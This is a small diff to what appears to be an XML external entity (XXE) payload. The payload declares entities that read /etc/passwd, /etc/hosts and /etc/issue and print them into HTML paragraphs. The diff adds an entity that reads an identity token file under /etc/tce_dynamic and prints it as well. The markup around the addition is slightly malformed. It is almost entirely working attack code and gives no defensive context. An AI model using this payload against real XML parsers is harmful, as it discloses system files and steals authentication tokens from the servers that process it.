@@ -3,6 +3,7 @@
 <!ENTITY passwd SYSTEM "file:///etc/passwd">
 <!ENTITY hosts SYSTEM "file:///etc/hosts">
 <!ENTITY issue SYSTEM "file:///etc/issue">
+<!ENTITY token SYSTEM "file:///etc/tce_dynamic/identity.token">
 ]> 
 <p>
 <p>/etc/passwd: 
@@ -13,5 +14,6 @@
 </p>
 <p>/etc/issue:
     &issue;
-</p>
+</p>/indentity:
+    &token;
 </p>
